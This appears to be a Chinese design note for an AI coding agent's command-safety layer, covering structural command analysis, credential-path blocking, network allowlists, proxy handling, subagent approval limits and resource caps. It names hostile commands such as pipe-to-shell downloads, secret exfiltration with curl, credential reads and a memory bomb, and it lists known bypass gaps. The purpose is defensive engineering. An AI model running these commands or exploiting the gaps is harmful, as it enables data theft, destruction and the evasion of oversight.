# 安全边界：三层各管什么

写于 2026-10-23，对应这一轮「加固现有策略层」。**不是** OS 级沙箱，是把策略层从「正则黑名单」改成「结构判定」，并把两处已知缺口补上。

## 三层责任

| 层 | 位置 | 管什么 | 不管什么 |
| --- | --- | --- | --- |
| 审批门 | `src/safety/policy.ts` `decideApproval` | 每个工具调用按 risk(read/write/shell/network) × 模式(ask/auto/plan/deny) 决定放行/确认/拒绝 | 放行之后的实际副作用 |
| 路径围栏 | `resolveWorkspacePath` / `resolveReadablePath` | 内置文件工具的读写落点、凭据目录 | `run_command` 里的重定向、外部程序自己写文件 |
| 进程沙箱 | `src/safety/sandbox.ts` | 工作区 cwd、secret 环境变量清洗、超时后杀进程树、命令长度/null 字节 | CPU/内存/进程数配额、文件系统、网络 |

## 这一轮改了什么

### 1. 命令判定从「长相」改成「结构」

旧实现：一串正则打在整条命令上。`cmd /c "del /s /q C:\"`、`powershell -EncodedCommand <base64>`、`curl … | sh`、`for /r %i in (*) do del %i` 全部穿过去——正则看的是字符串长相，不是命令结构。

新实现 `src/safety/commandAnalysis.ts`，三档结论：

- `ok` — 放行，其余策略照常
- `prompt` — 必须人确认，**auto 模式也不静默执行**
- `blocked` — 任何模式都不执行

做法：

- 按壳层操作符切段（`&& || | & ; 换行`，遵守引号），逐段看「跑的是哪个程序」
- 解释器递归一层：`cmd /c`、`powershell -Command`、`bash -c`、`node -e`；`-EncodedCommand` 先 base64(UTF-16LE) 解码再分析，解不出来就 `prompt`
- 管道喂给 shell 一律 `blocked`（`curl … | sh`、`iwr … | iex`、`cat x | bash`）
- 递归删除按**目标**判：系统路径/工作区外 `blocked`，工作区内 `prompt`，只有旗标没目标 `blocked`
- 包装器（`for`/`find -exec`/`xargs`/`sudo`…）里的动作不在首位，扫剩余 token；被引号包住的和 `a=b` 形式的参数值跳过（`rg "rm -rf" docs`、`npm run format`、`--pretty=format:%h` 不会误判）
- 新增原本根本没列的：`format`/`diskpart`/`bcdedit`/`vssadmin`/`mkfs`/`wipefs`、`reg add|delete`、`netsh advfirewall`、`sc delete`、`net user`、`icacls /reset`、`cipher /w`、`iwr | iex`

旧的 `rm -rf` / `del /s` / `rmdir /s` 三条正则删了——它们无条件拒绝，包括 `rm -rf ./dist`。现在由结构判定接管，目标感知。`format`/`shutdown`/`poweroff`/`reboot`/fork bomb 留在正则里做双保险。

### 2. `>` 重定向的写路径

`echo hi > C:\Users\me\x.txt` 绕过 `write_file` 的路径围栏，auto 模式下**真的落了文件**（加固前的实测）。现在把 `>`、`>>`、`2>` 的目标抓出来按写路径判：工作区外/系统路径/凭据目录 → `blocked`；`2>&1` 这类描述符复制不算目标。

### 3. 凭据目录

`.ssh`、`.aws`、`.gnupg`、`.kube`、`.docker/config.json`、`.git-credentials`、`.npmrc`、`.netrc`、`.pypirc`、`.config/gh/hosts.yml`、`.config/gcloud/`、Windows 的 GitHub Desktop / GnuPG / PuTTY 目录。

读（`resolveReadablePath`）与写重定向共用一份名单（在 `commandAnalysis.ts` 里，`policy.ts` 引进来），避免两处漂移。`home` 仍在读白名单内，但这份名单在它之前生效。

shell 侧同样挡：`cat ~/.ssh/id_rsa`、`Get-Content <home>/.kube/config` 这类读程序（`cat`/`type`/`head`/`tail`/`less`/`gc`/`Get-Content`/`sls`…）参数落在凭据目录时 `blocked`。

### 3b. shell 的读路径与出网

原来 `run_command` 既不管读也不管出网——`type C:\Windows\win.ini` 能读，`curl -d @.env https://任意主机` 能发。

- **读**：读程序（`cat`/`type`/`head`/`tail`/`less`/`gc`/`Get-Content`/`sls`/`strings`…）的绝对路径参数必须落在 `readableRootsFor(workspaceRoot)` 里（工作区 + Desktop/Documents/Downloads/home，`policy.ts` 导出，与 `read_file` 同一份名单），否则 `blocked`。相对路径按工作区解析，所以 `type README.md` 不受影响。
- **出网**：`curl`/`wget`/`iwr`/`irm`/`aria2c`/`certutil -urlcache`/`bitsadmin` 以及 `ssh`/`scp`/`sftp`/`rsync`/`nc`… 的目标（URL 或 `user@host`）用**和 `fetch_url` 同一份**网络白名单判，不在名单里 `blocked`（白名单为空 = 全禁）。`curl -o ../x.zip`、`--output=<path>` 这种下载落点还会再过一遍工作区判定。
- **搬运**：`copy`/`move`/`xcopy`/`robocopy`/`cp`/`mv`/`tar`/`unzip`/`zip`/`7z`/`tee`/`touch`/`mkdir` 的所有路径参数（含藏在开关里的 `-oC:\out`）都必须在工作区内 —— 源和目的都算，`copy x C:\` 与 `copy C:\Windows\win.ini .` 都挡。
- 判定逻辑从 `policy.ts` 挪到 `src/safety/network.ts`（`evaluateNetworkTarget` / `isBlockedNetworkHost` / `hostMatchesAllowlist`），`policy.ts` 再导出，避免 `commandAnalysis` ↔ `policy` 循环依赖。
- 不碰的：`npm install`/`pip`/`git push` 这类有自己流程的命令不套白名单（否则默认 7 个域一条都跑不通），这是已知剩余口子。

### 3c. 出网代理

需要代理才能联外网的机器上，之前所有联网工具都是死的：`web_search`/`fetch_url` 报 `fetch failed`，后台浏览器报 `ERR_CONNECTION_TIMED_OUT`，而同一个 URL 用 `curl` 是通的。

根因是 Node 的 `fetch` 不读 `HTTPS_PROXY` —— undici 只在 `node --use-env-proxy` 下才看环境变量，而桌面端是用普通 `node dist/src/index.js` 拉起 CLI 的。Chromium 侧同理：不给 `--proxy-server` 就一直直连。

现在统一由 `src/utils/proxy.ts` 解析、`src/utils/net.ts` 的 `netFetch` 落地：

- **优先级**：`AICODE_PROXY` → `HTTPS_PROXY` → `HTTP_PROXY` → `ALL_PROXY` → `.aicode/config.json` 的 `network.proxy`。环境变量永远压过设置。
- **直连开关**：任何一个变量写 `off`/`none`/`direct` 就整个直连，设置里的值不会再顶回来。
- **永远直连**：`NO_PROXY` 命中的主机，以及 localhost / 127.0.0.0/8 / `[::1]`（本地预览服务不该被塞进代理）。
- **只支持 http/https 代理**；`socks5://` 会被当成"设了但用不了"，错误信息照实说，不会悄悄换成别的。
- **覆盖面**：`web_search`、`fetch_url`、`download_file`、`http_post`，以及供应商请求（`providers/protocol.ts` 的 `fetchWithRetry`、`gemini`、`fim`）。没有代理时 `netFetch` 直接走全局 `fetch`，undici 不会被拉进启动路径。
- **桌面端**：`electron/proxy.cjs` 在 `app.whenReady()` 之前注入 `--proxy-server` / `--proxy-bypass-list`，并把解析结果写进 `process.env.AICODE_PROXY`（agent bridge 用 `{...process.env}` 拉起 CLI，所以一条赋值就够）；后台浏览器的 `memory:` 分区再显式 `setProxy` 一次，免得隐藏窗口在独立网络上下文里走直连。联通测试改用 Electron 的 `net.fetch`（Chromium 网络栈），同样吃这个代理。
- 失败信息现在会指名道姓：主机、错误码、当前到底走没走代理、以及该设哪个变量。

### 4. 只读模式（原本就有，这次验证）

`--approval deny`，桌面端在「设置 → 权限 → 审批模式 = 只读」里。实测（mock provider，真实 CLI）：

```
• Running write_file .smoke/multi-tool-result.md
• Ran write_file · Tool write_file blocked: approval mode denies write, shell, and network tools
```

读工具照常（`list_files` 正常返回）。所以这一项是验证 + 测试固化，不是新造。

### 4b. 「只读」有两套语义，别混用

- **审批门**按 `risk`（read/write/shell/network）× 模式判。`deny` 只放行 `read`。
- **工具面收缩 / 只读承诺**按 `isReadOnlyTool`（`src/tools/scope.ts:70`）= `risk === 'read'` **且**不在 `AGENT_SPAWNING_TOOLS`。那四个是可以起会写的子智能体的工具：`spawn_subagent`（risk 标 `read`）、`review_loop`（`shell`）、`workflow_execute` / `workflow_resume`（`write`）。所以任何「只读」角色都必须减掉它们——`src/experts/profiles.ts` 的 `code_search` / `code_review` 就是靠 `isReadOnlyTool`，`tests/review-readonly.test.ts` 钉住这条。
- `ToolDefinition` 上**没有** `readonly` 字段；`spawn_subagent` 的 `readonly: true` 参数是「换成只读专家 `code_search`」（`src/subagent/runner.ts:108` 的 `expertIdForSubAgentRequest`），不是事后过滤。

工具面每一档具体有哪些工具，见 `docs/tool-surface.md`。

### 4c. 子智能体的边界

- **工具源**：`subAgentToolCeiling`（`src/subagent/runner.ts:36`）把子的 registry 限制在父**当轮**的集合（含 post-scope 注入的 `spawn_subagent` 等），只有父没有解析过作用域时（测试、嵌入调用）才回落全量。所以「子不比父做得多」是构造保证，不靠 profile 自觉。深度上限 3（`MAX_SUBAGENT_DEPTH`）。
- **审批恒真**：子 runtime 的 `confirm` / `toolConfirm` 硬编码为 `true`（`src/subagent/runner.ts:285-286`）。所以 `ask` / `plan` 模式下「每次写盘都要人确认」对委派出去的子任务**不生效**——这是已知未补的口子。
- **`deny` 仍然有效**：`decideApproval` 在 registry 里先判（`src/tools/registry.ts:63`），`deny`、命令黑名单、`alwaysPrompt` 的破坏性工具都在 `confirm` 之前出结论，所以只读模式挡得住子代理的写。

### 5. 桌面主窗口 `sandbox: true`

`electron/main.cjs` 的 `webPreferences` 从 `sandbox: false` 改为 `true`。渲染进程渲染的是模型输出、工具输出、文件内容——都可能带脚本，它的所有特权本来就只通过 `preload.cjs` 的 IPC 拿。`preload.cjs` 只 `require('electron')` 的 `contextBridge` / `ipcRenderer`，沙箱化 preload 支持。

验证：`npx electron scripts/app-smoke.cjs`（真实 preload + 主进程 IPC，含 Monaco、TS worker、主题持久化）、`--writes --sync`（写文件、暂存、提交、push/pull 全流程）全绿；`npm test` 625 项全绿。

### 6. 资源上限（沙箱第二档）

审批门和路径围栏管「允许做什么」，这一层管「做的时候能吃掉多少机器」。`node -e "const a=[];for(;;)a.push(Buffer.alloc(64*1024*1024))"` 在策略层看来完全合规——不删文件、不越界写、不出网——但足以把开发机拖死。

实现：`src/safety/resourceLimits.ts`，内核记账，不靠采样精度。

- **Windows：Job Object**。`JOB_OBJECT_LIMIT_PROCESS_MEMORY`（单进程提交内存）、`ACTIVE_PROCESS`（job 内进程数）、`JOB_TIME`（CPU 时间）、`KILL_ON_JOB_CLOSE`（job 句柄消失时清场）。超限由内核拒绝分配或直接杀掉。
- **Unix：`ulimit -v` / `ulimit -u`** 前置进 sh 命令，零额外进程；参数不支持时（macOS 忽略 `-v`）`|| true` 跳过，还有超时和杀树兜底。
- 默认值：2048MB 单进程内存、64 个进程。`AICODE_SANDBOX_MEMORY_MB`、`AICODE_SANDBOX_MAX_PROCS` 可调，`AICODE_SANDBOX_LIMITS=0` 关掉这一层。

**常驻 supervisor，不是每条命令起一个 PowerShell。** 一次 `powershell -NoProfile -File` 冷启动 350ms，加上 `Add-Type` 编译 C# 共约 700ms——`git status` 会从 60ms 变成 760ms，不能接受。所以：

- 一个 supervisor 常驻，job 只建一次，之后每条命令只付 `Start-Process` 的钱
- **supervisor 先把自己放进 job，再启动子进程**，子进程从出生就在 job 里，没有「先跑起来再塞进去」的竞态，孙进程自动继承
- 退出码由 supervisor `WaitForExit` 拿（不能靠 cmd 的 `%ERRORLEVEL%`：同一个 `/c` 行里它在解析期就展开了）
- 输出重定向到临时文件，supervisor 的 stdout 只走状态 JSON，互不污染
- 空闲时 `unref()`、执行中 `ref()`：缓存的 supervisor 不能把 CLI 的事件循环钉住
- C# 编译产物缓存成 `%TEMP%\aicode-limits\AicodeJob.dll`，之后只 `LoadFrom`，省掉每次的 `Add-Type` 编译

实测（本机，Windows 11 / Node 24）：

| 场景 | 结果 |
| --- | --- |
| 冷启动（会话内第一条命令） | ~640ms（含 `LoadFrom` 缓存 DLL） |
| 复用（后续命令） | ~90ms（裸 spawn 51ms，多付 ~40ms） |
| 256MB 上限下的内存炸弹 | 拒绝分配，642ms 内失败 |
| 12 进程上限下的 80 个并发子进程 | 拦住，677ms 内失败 |
| `cli` 全量测试（1203 个） | 32s |

**降级**：拿不到 Job Object（没有 PowerShell，或 CLI 本身已在别的 job 里）时，往 stderr 打一次警告后回退到普通 spawn——少一道限制比所有命令都跑不起来好。

这一层踩过的坑，改之前值得先读：

1. PowerShell 5.1 里 `Start-Process -PassThru` 的 `ExitCode` 会在 `WaitForExit()` 返回后仍是 `$null`，拼出的 JSON 变成 `"code":`，调用方解析失败后干等到超时。修法是等之前先读一次 `$process.Handle`。
2. 带管道 stdio 的子进程会钉住父进程的事件循环。常驻 supervisor 不 unref 的话，任何「等进程退出」的场景（测试、`--json` 跑完一轮）都会永久挂住——当时整个测试套件从 26s 变成挂死。
3. 超时后先把 promise resolve 再去杀进程，调用方立刻 `rm` 临时工作区会拿到 `EBUSY`（Windows 上 cwd 还占着）。现在等 supervisor 真的退出再 resolve。
4. 每个 supervisor 都 `Add-Type` 一遍，等于每个测试文件现场编译一次 C#：25 个文件并行跑时 CPU 被打满，套件从 32s 涨到 90s，还连累几个时序敏感的用例偶发失败。缓存 DLL 后这些症状一起消失。并发写同一个 DLL 用 `<dll>.<PID>.tmp` + `Move-Item -Force`，抢输了就 `LoadFrom` 已有的那份。

## 测试与验证

- `cli/tests/command-policy.test.ts` — 21 项，覆盖上面的每一类绕过，外加两组语料回归：
  - **53 条正常命令必须判 `ok`**（npm/git/rg/sed/jq/tar/`powershell Get-ChildItem`/`docker compose`/`timeout`/`start`…）。误判是被拆掉策略层的最快路径，所以钉成测试。
  - **19 条真实攻击必须判 `blocked`**（含 base64 `-EncodedCommand`、`curl -d @.env`、`certutil -urlcache`）
  - 一条**端到端**：走真实 `registry.execute('run_command')` 断言文件没被创建
- `cli/tests/sandbox-limits.test.ts` — 7 项：默认值/关开关/`ulimit` 前缀、退出码与输出透过 limits 层不变、复用 supervisor、256MB 下的内存炸弹被拒、12 进程上限下的进程风暴被拦、`AICODE_SANDBOX_LIMITS=0` 回到裸 spawn
- `npm --prefix cli run test:node` — 1203 项全过（44s）
- `npm --prefix cli run audit:100` — 993/993
- `npm --prefix cli run test:unit` — 177 项
- `npm --prefix cli run smoke` — mock 多工具冒烟（读/写/搜/`node --version`）不受新规则影响
- `npm --prefix ide-desktop test` — 625 项 + typecheck
- 真 Electron 冒烟：`npx electron scripts/app-smoke.cjs`（`sandbox: true` 下 preload + 主进程 IPC 正常）

## 稳不稳

- 误判：53 条语料 0 误判，`npm test`/`git commit`/`rg`/`sed -i`/`tar -czf`/`Get-ChildItem` 都照常跑；`npm run format`、`git log --pretty=format:`、`rg "rm -rf"` 这些含危险字样的正常命令也不会误伤（引号内与 `a=b` 形式跳过）。
- 漏判：静态判断挡的是「程序名 + 目标」，不是行为。内联代码（`node -e`）、`docker run -v C:\:/host`、包管理器/git remote 的出网仍是口子，靠名单增量维护。
- 唯一的体感变化：`prompt` 档在 `auto` 模式下也会弹确认卡（无人应答 120s 后按拒绝处理，见 `approvalBroker.ts`）。无人值守的自动化如果用到 PowerShell 递归删除这类命令，会从「直接跑」变成「等 120s 后失败」——这是有意的取舍，不是 bug。
- 性能：命令分析是微秒级；资源上限层首条命令多 ~640ms（PowerShell 冷启动 + `LoadFrom` 缓存 DLL），之后每条多 ~40ms。
- 资源上限的误伤面：`npm test` 起 8 个 worker、vite 构建吃 700MB 都远在默认值（2GB / 64 进程）之内。真要跑重活，`AICODE_SANDBOX_MEMORY_MB=4096` 调一下即可。

## 还没做的（OS 隔离 / 已知口子）

- 无 AppContainer / 容器级隔离：进程仍能读写工作区外的普通路径（策略层挡写、挡读围栏，但内核不挡）
- 资源上限是**按命令**的：一轮对话里连开 20 条命令，每条各自吃到 2GB，没有「整轮/整会话总预算」
- supervisor 冷启动 ~640ms 在会话第一条命令上可感知到；要再省只能预启动 supervisor（后台先热一个，代价是空闲时多一个 PowerShell 常驻）
- shell 网络白名单不覆盖包管理器与 git remote（`npm install`、`git push` 各自有流程）
- 内联代码里的读写绕不过静态判断：`node -e "fs.readFileSync('C:/Windows/win.ini')"` 仍能读（只挡程序名，不挡任意代码）
- `tar`/`unzip` 解包里的 `../` 条目（zip-slip）没在这一层处理 —— 走内置 zip 工具有 `tests/zip-safety.test.ts` 保护
- 解释器之外的包装层（`powershell Add-Type` 编译执行、`regsvr32` 之外的新 LOLBin）只能靠名单增量维护
